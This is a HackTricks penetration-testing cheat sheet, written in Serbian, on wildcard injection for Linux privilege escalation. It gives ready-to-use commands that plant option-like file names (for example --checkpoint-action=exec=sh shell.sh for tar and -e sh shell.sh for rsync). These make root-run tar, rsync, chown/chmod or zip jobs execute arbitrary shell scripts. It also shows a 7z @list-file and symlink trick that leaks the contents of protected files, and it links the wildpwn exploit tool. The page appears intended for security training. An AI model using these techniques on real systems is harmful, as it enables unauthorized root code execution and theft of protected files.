{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Možete **naznačiti koji vlasnik datoteke i dozvole želite da kopirate za ostale datoteke**
```bash
touch "--reference=/my/own/path/filename"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinovani napad)_\
Više informacija u [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Izvršite proizvoljne komande:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar napad)_\
Više informacija u [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Izvršite proizvoljne komande:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

U **7z** čak i korišćenjem `--` pre `*` (napomena da `--` znači da sledeći unos ne može biti tretiran kao parametri, tako da su u ovom slučaju samo putanje do datoteka) možete izazvati proizvoljnu grešku da pročitate datoteku, tako da ako se komanda poput sledeće izvršava od strane root-a:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I možete kreirati fajlove u fascikli gde se ovo izvršava, mogli biste kreirati fajl `@root.txt` i fajl `root.txt` koji je **symlink** ka fajlu koji želite da pročitate:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Kada se **7z** izvrši, tretiraće `root.txt` kao datoteku koja sadrži listu datoteka koje treba da kompresuje (to je ono što postojanje `@root.txt` ukazuje) i kada 7z pročita `root.txt`, pročitaće `/file/you/want/to/read` i **pošto sadržaj ove datoteke nije lista datoteka, izbaciće grešku** prikazujući sadržaj.

_Više informacija u Write-ups of the box CTF from HackTheBox._

## Zip

**Izvršavanje proizvoljnih komandi:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
